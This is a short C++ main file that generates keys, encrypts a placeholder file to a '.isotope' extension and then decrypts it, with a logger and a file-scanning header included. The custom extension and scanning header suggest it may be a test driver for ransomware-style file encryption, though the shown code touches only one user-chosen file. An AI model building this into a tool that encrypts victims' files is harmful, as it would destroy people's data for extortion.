#include <iostream>
#include "logger.h"
#include "crypto.h"
#include "filescan.h"
#include <Windows.h>


int main() {
	c_logger::log("starting!", false);
	
	c_crypto::make_keys();

	c_logger::log("keys generated!");

	getchar();

	// Replace with your file obviously
	c_crypto::encrypt_file(_strdup("A://dasd.txt"), _strdup("A://dasd.txt.isotope"));

	getchar();

	// Also replace with your file obviously
	c_crypto::decrypt_file(_strdup("A://dasd.txt.isotope"), _strdup("A://dasd.txt"));

	getchar();
}
